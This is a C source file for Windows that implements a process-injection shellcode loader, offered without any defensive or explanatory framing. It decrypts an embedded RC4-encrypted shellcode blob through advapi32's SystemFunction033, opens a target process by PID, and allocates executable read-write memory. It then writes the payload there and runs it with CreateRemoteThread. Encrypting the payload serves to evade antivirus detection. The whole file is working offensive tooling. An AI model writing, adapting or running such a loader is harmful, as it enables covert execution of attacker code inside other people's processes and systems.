#include"Rc4.h"

#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)



//Here we used xor enc on the payload

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char R0m4InShell[] = {
    0x77, 0x99, 0x3d, 0x51, 0x8f, 0xd4, 0xb6, 0xdf, 0x78, 0xf6, 0x21, 0xf0, 0x31, 0xb3, 0x5a, 0x3a,
    0x29, 0x30, 0x29, 0xc0, 0x17, 0x72, 0xc3, 0xb1, 0xf9, 0x0d, 0x46, 0x6d, 0x1c, 0x19, 0xa6, 0x6b,
    0xb4, 0x7b, 0x00, 0xa7, 0xbc, 0x69, 0x94, 0xe2, 0x42, 0x4b, 0xbf, 0x3c, 0x3f, 0x40, 0xac, 0xcf,
    0x5c, 0x79, 0x48, 0xe3, 0x15, 0xf0, 0x16, 0x73, 0xc0, 0x91, 0x1e, 0x69, 0xbb, 0x87, 0x88, 0x35,
    0x1c, 0x19, 0x09, 0x63, 0x89, 0x35, 0x7b, 0x8b, 0x18, 0xf9, 0xf6, 0xbe, 0xc7, 0x2e, 0x72, 0x57,
    0xb3, 0xa6, 0x08, 0x1d, 0xb4, 0xf2, 0xbe, 0x94, 0xf0, 0xd0, 0x16, 0x72, 0x91, 0xbe, 0x29, 0x68,
    0x9d, 0xa1, 0x5b, 0x0f, 0x0a, 0xf2, 0x5c, 0x13, 0x00, 0x5f, 0xfb, 0xaa, 0xd6, 0x68, 0xe2, 0xca,
    0x28, 0x86, 0xe4, 0x5f, 0xc7, 0x97, 0xd4, 0x90, 0x60, 0xaf, 0x0a, 0xa7, 0x7e, 0x38, 0x43, 0x68,
    0xf5, 0x5f, 0x10, 0xf1, 0x8c, 0xad, 0xae, 0x8e, 0x95, 0x70, 0x8e, 0x8c, 0x57, 0x44, 0x44, 0xe9,
    0x20, 0xc4, 0xc6, 0xd9, 0x60, 0x73, 0xee, 0x1f, 0xe1, 0x15, 0x80, 0x00, 0xd1, 0xa3, 0x3e, 0xcb,
    0x3c, 0xed, 0x8c, 0x6b, 0xce, 0x4f, 0xd4, 0x57, 0x5b, 0xd0, 0x2d, 0xee, 0xb9, 0xef, 0x92, 0x8c,
    0x34, 0xef, 0x22, 0x6f, 0x34, 0x10, 0xe0, 0x92, 0x0e, 0x8c, 0x17, 0x54, 0x58, 0xcf, 0xe9, 0xbf,
    0x1d, 0x5d, 0xa1, 0xa2, 0x11, 0x08, 0x0c, 0x0e, 0xcd, 0x19, 0xa5, 0x5a, 0x0c, 0xdd, 0x1c, 0x91,
    0xfc, 0xd6, 0x4c, 0x7c, 0xbe, 0xef, 0xe2, 0xd3, 0xf3, 0xa6, 0x78, 0xb4, 0x9a, 0x32, 0xc8, 0x48,
    0xa4, 0x0a, 0x61, 0x3f, 0xa7, 0x82, 0x91, 0x88, 0xe1, 0x4e, 0xdc, 0xd5, 0xf5, 0xe2, 0xea, 0xd4,
    0xc7, 0xae, 0x14, 0x69, 0x0e, 0x3e, 0x8c, 0xc5, 0xde, 0x14, 0x1e, 0x6c, 0xdf, 0xca, 0x5b, 0xd4,
    0x90, 0x3a, 0x8c, 0xcc, 0x90, 0x5e, 0xb0, 0xb4, 0x5d, 0xe6, 0xbf, 0x09, 0x8b, 0xbe, 0x2e, 0x8b,
    0x81, 0x58, 0x53, 0x44, 0x84, 0xaa, 0x5f, 0x2c, 0x72, 0xb4, 0x38, 0x97, 0x40, 0x98, 0x70, 0x47,
    0x95, 0x3e, 0x79, 0x78, 0xe5, 0x3a, 0x46, 0x4f, 0x8e, 0x6d, 0xa1, 0x20, 0xae, 0xfa, 0x7c, 0x45,
    0x0f, 0xde, 0xb7, 0x78, 0x2d, 0xc2, 0x00, 0xfc, 0xba, 0x4a, 0x8e, 0xea, 0xb7, 0xdb, 0xbd, 0x7e,
    0x8c, 0x2c, 0xa5, 0x03, 0x78, 0x43, 0x93, 0x6d, 0x88, 0x21, 0x51, 0x7f, 0x86, 0x20, 0xaf, 0xf3,
    0x7e, 0xa8, 0x12, 0xac, 0xf7, 0xc9, 0xe9, 0x3d, 0x7b, 0xdd, 0xeb, 0x30, 0x0b, 0x81, 0x18, 0xb7,
    0x05, 0xbd, 0x3e, 0xf5, 0x20, 0x4e, 0x5c, 0x8f, 0xec, 0x7a, 0xbc, 0x75, 0x54, 0x59, 0x5c, 0xcc,
    0x3b, 0x64, 0xc5, 0x53, 0xa4, 0x18, 0x51, 0x07, 0x80, 0xf1, 0x9f, 0x67, 0x3f, 0x6c, 0x44, 0x30,
    0x58, 0x0f, 0x8f, 0x1e, 0x2c, 0xc2, 0xc3, 0x8e, 0x31, 0x90, 0x2a, 0x54, 0x3b, 0x4f, 0xc5, 0x69,
    0xd1, 0xbb, 0xbb, 0x5d, 0xed, 0xe2, 0x98, 0x82, 0x69, 0xed, 0xc4, 0x66, 0x70, 0x98, 0x3b, 0x42,
    0x32, 0x28, 0xa4, 0xf5, 0xee, 0x94, 0xc6, 0xc0, 0xd8, 0xa7, 0xa8, 0x18, 0x72, 0x04, 0xb4, 0x5e,
    0x4f, 0x97, 0x7e, 0x11, 0x9e, 0xa8, 0x2c, 0x8d, 0x97, 0xf4, 0x4e, 0x50, 0xa5, 0xdc, 0x0b, 0x43,
    0xee, 0x80, 0x43, 0x1a, 0x39, 0x8c, 0xd6, 0x1e, 0x55, 0x40, 0xf7, 0x75, 0xf2, 0x58, 0x29, 0xe7,
    0xf0, 0x97, 0xc9, 0xc7, 0x0a, 0x0d, 0xc3, 0xf8, 0x0e, 0x86, 0x4f, 0xf2, 0x46, 0x02, 0xa0, 0xfd,
    0x6e, 0x6c, 0x04, 0x5a, 0xc4, 0x24, 0x2c, 0xbb, 0x0e, 0xbb, 0x34, 0x4d, 0x4a, 0x5b, 0xb3, 0xe4,
    0x13, 0x88, 0xc1, 0x55, 0xf0, 0x59, 0xe0, 0x3b, 0xe4, 0x8b, 0x69, 0x2a, 0x72, 0xd3, 0x3c, 0x36,
    0x97, 0xaf, 0xaf };
char _key[] = "R0m4Rc4_enc";

// Function to decrypt the shellcode

int main(int argc, char* argv[]) {

    HMODULE hAdvapi;
    hAdvapi = LoadLibrary(L"advapi32.dll");

    key.Buffer = (PUCHAR)(&_key);
    key.Length = sizeof key;

    _data.Buffer = (PUCHAR)R0m4InShell;
    _data.Length = sizeof R0m4InShell;
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(hAdvapi, "SystemFunction033");

    SystemFunction033(&_data, &key);

    printf("\nunsigned char shellcode[] = { ");
    for (size_t i = 0; i < _data.Length; i++) {
        if (!(i % 16)) printf("\n    ");
        printf("0x%02x, ", _data.Buffer[i]);
        if (i == _data.Length - 1) printf("0x%02x };", _data.Buffer[i]);
    }


    if (argc < 2) {
        warning("you should enter the process ID to inject the SHELLCODE in !! \n USAGE : R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    info("Now we are trying to open the process with the ID : %ld \n", PID);


    if (!hAdvapi) {
        printf("Can't get a handle on advapi ----------0x%lx", GetLastError());

        return EXIT_FAILURE;
    }
    info("module imported");

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess != NULL) {
        okay("We got handle on the process----------0x%p", hProcess);


        // Allocate some bytes to the process memory
        rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions inside %ld", sizeof(R0m4InShell), PID);

        // Decrypt the shellcode
        // Write the decrypted shellcode into the process memory

        WriteProcessMemory(hProcess, rBuffer, _data.Buffer, sizeof(R0m4InShell), NULL);
        info("Wrote %zu-bytes to process memory\n", sizeof(R0m4InShell));

        // Clean up

        // Create remote thread to execute shellcode
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
        if (hThread != NULL) {
            info("Created remote thread in the process %ld with the TID %ld", PID, TID);
        }
        else {
            warning("Failed to create remote thread: %ld", GetLastError());
        }

        // Close handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
    else {
        warning("Failed to open process: %ld", GetLastError());
    }

    return EXIT_SUCCESS;
}
